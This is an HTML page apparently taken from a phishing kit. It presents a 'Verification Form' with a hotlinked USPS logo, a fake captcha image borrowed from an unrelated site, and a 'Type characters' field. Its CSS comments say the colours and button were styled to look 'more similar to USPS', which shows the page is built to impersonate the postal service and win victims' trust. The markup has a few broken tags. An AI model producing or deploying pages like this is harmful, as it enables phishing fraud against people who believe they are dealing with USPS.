
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Form</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            height: 100vh;
        }

        .container {
            width: 310px;
            padding: 70px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        h1 {
            color: #333;
            margin-top: 20px; /* Added spacing above the heading */
            margin-bottom: 20px; /* Added spacing below the heading */
        }

        label {
            display: block;
            margin-top: 20px;
            font-size: 16px;
            color: #555;
        }

        input {
            width: 100%;
            padding: 10px;
            margin-top: 8px;
            margin-bottom: 20px; /* Added space between input and button */
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }

        button {
            background-color: #004a8e; /* Adjusted color to be more similar to USPS */
            color: #fff;
            padding: 12px 24px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s ease;
            /* USPS-style button design */
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        button:hover {
            background-color: #003366; /* Darker blue on hover */
        }

        .error-message {
            color: red;
            margin-top: 10px;
        }
    </style>
</head>
<body>

<div class="container">
     <img src="https://www.usps.com/global-elements/header/images/utility-header/logo-sb.svg" alt="" width="300" height="100">
      </img>

    <h2>Verification Form</h2>

    
    <form method="post">
	<img  src="https://secondary.obec.go.th/newweb/maps/secondary.png" alt="" width="250" height="100"> <style="display: inline;">
        <label for="auth-captcha-guess">Type characters</label> 
        <input type="text" id="auth-captcha-guess" name="guess" required>

        <button type="submit">Continue</button>
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
    </form>

</div>

</body>
</html>
